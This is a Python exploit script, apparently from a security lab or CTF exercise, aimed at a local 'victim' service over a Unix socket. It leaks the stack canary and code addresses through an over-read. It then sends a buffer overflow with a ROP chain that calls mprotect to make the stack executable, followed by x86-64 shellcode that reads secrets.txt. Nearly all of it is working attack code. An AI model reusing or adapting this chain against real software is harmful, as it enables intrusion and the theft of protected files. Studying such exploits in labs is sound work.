import os
import socket
import struct
import sys

#create a socket to read from file handler
sock = os.getenv("HOME") + "/victim.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock)

#send string and length to server
strg = b'A' * 16 + b'\n648\n'
s.send(strg)
data = s.recv(1024)

b_canary = []
canary = []
ret_addr = []
b_bin_addr = []
bin_addr = []
#valuebyte = ''

for i in range(len(data)):
	this_byte = hex(ord(data[i]))
	if len(this_byte) == 3:
		this_byte = '0x0' + this_byte[2]
	#valuebyte += this_byte + '\t'
	if i>23 and i<32:
		canary.append(this_byte)
		b_canary.append(ord(data[i]))
	if i>639 and i<648:
		ret_addr.append(this_byte)
	if i>271 and i<280:
		bin_addr.append(this_byte)
		b_bin_addr.append(ord(data[i]))
	#if (i+1)%8 == 0:
		#print(valuebyte)
		#valuebyte = ''

# get binary base address (entry location)
#os.system('readelf -a victim | grep -i "entry" > tmp')
#binadd = open('tmp', 'r').read()
#binadd = binadd.split(':')

canary.reverse()
canary_str = ''
for c in range(8):
	canary_str += canary[c]

ret_addr.reverse()
ret_addr_str = ''
for r in range(8):
	ret_addr_str += ret_addr[r]

bin_addr.reverse()
bin_addr_str = ''
for b in range(8):
	bin_addr_str += bin_addr[b]

write_to_file = '0x' + canary_str.replace('0x','') + '\n0x' + ret_addr_str.replace('0x','') + '\n0x' + bin_addr_str.replace('0x','') + '\n'

filename = 'leaked_data.txt'
with open(filename, 'w') as file_object:
    file_object.write(write_to_file)

# add offset to base address and conver to little endian

b_num = bin_addr_str.replace('0x','').encode()
b_die = bin_addr_str.replace('0x','').encode()
b_pwn = ret_addr_str.replace('0x','').encode()

# for pop rdi; ret
b_num = hex(int(b_num,16) + int('0xf33',16))

# for die()
b_die = hex(int(b_die,16) + int('0xaea',16))

# for string
b_pwn = hex(int(b_pwn,16) - int('0x3a0',16))

bnum2 = ''
bdie2 = ''
bpwn2 = ''

if len(b_num) < 18:
	for i in range(18-len(b_num)):
		bnum2+='0'
bnum2+=b_num.replace('0x','')

if len(b_die) < 18:
        for i in range(18-len(b_die)):
                bdie2+='0'
bdie2+=b_die.replace('0x','')

if len(b_pwn) < 18:
        for i in range(18-len(b_pwn)):
                bpwn2+='0'
bpwn2+=b_pwn.replace('0x','')

bin_addr = []
this_byte = ''
for i in range(16):
	this_byte += bnum2[i]
	if (i+1)%2 == 0:
		bin_addr.append(int(this_byte,16))
		this_byte=''
bin_addr.reverse()
b_address = []
for i in range(8):
	b_address.append(bin_addr[i])

die_addr = []
this_byte = ''
for i in range(16):
        this_byte += bdie2[i]
        if (i+1)%2 == 0:
                die_addr.append(int(this_byte,16))
                this_byte=''
die_addr.reverse()
d_address = []
for i in range(8):
        d_address.append(die_addr[i])

pwn_addr = []
this_byte = ''
for i in range(16):
        this_byte += bpwn2[i]
        if (i+1)%2 == 0:
                pwn_addr.append(int(this_byte,16))
                this_byte=''
pwn_addr.reverse()
pwn_address = []
for i in range(8):
        pwn_address.append(pwn_addr[i])

strg = b'pawned!\0' # pawned!
strg+= b'AAAAAAAA'  # AAAAAAAA
strg+= b'BBBBBBBB'  # BBBBBBBB
for c in range(8):
        strg += struct.pack('B',b_canary[c]) # canary
strg+= b'\xde\xad\xbe\xef\x00\x00\x00\x00' # deadbeef
strg+= b'\x8f\x4e\x55\x55\x55\x55\x00\x00' # 0e8f : pop rdx ; ret
strg+= b'\x07\x00\x00\x00\x00\x00\x00\x00' # 7
strg+= b'\x31\x4f\x55\x55\x55\x55\x00\x00' # 0f31 : pop rsi ; pop r15 ; ret
strg+= b'\x00\x10\x02\x00\x00\x00\x00\x00' # 21000
strg+= b'\x00\x10\x02\x00\x00\x00\x00\x00' # 21000
strg+= b'\x33\x4f\x55\x55\x55\x55\x00\x00' # 0f33 : pop rdi ; ret
strg+= b'\x00\xe0\xfd\xff\xff\x7f\x00\x00' # 0x7ffffffde000 stack start
strg+= b'\x30\xe8\xb0\xf7\xff\x7f\x00\x00' # mprotect()
strg+= b'\x30\xe5\xff\xff\xff\x7f\x00\x00' # 0x7fffffffe530
#shellcode
strg+= b'\xeb\x41\x48\x31\xc0\x04\x02\x5f'
strg+= b'\x48\x31\xf6\x0f\x05\x48\x89\xc7'
strg+= b'\x66\x81\xec\xff\x0f\x48\x8d\x74'
strg+= b'\x24\x08\x48\x31\xd2\x80\xc2\xff'
strg+= b'\x48\x31\xc0\x0f\x05\x48\x31\xc0'
#strg+= b'\x48\xff\xc0\x80\xc2\x04\x48\x89' # write to file handle 4 - socket
strg+= b'\x48\xff\xc0\x48\x89\xc7\x48\x89' # write to file handle 1 - stdout
strg+= b'\xe6\x48\x31\xd2\x80\xc2\xff\x0f'
strg+= b'\x05\x48\x31\xc0\x04\x3c\x48\x31'
strg+= b'\xff\x0f\x05\xe8\xba\xff\xff\xff'
strg+= b'\x73\x65\x63\x72\x65\x74\x73\x2e'
strg+= b'\x74\x78\x74\x90\x90\x90\x90\x90'

#send string and length to server
strg += b'\n88\n'
#print(strg)
s.send(strg)
data = s.recv(1024)
s.close()
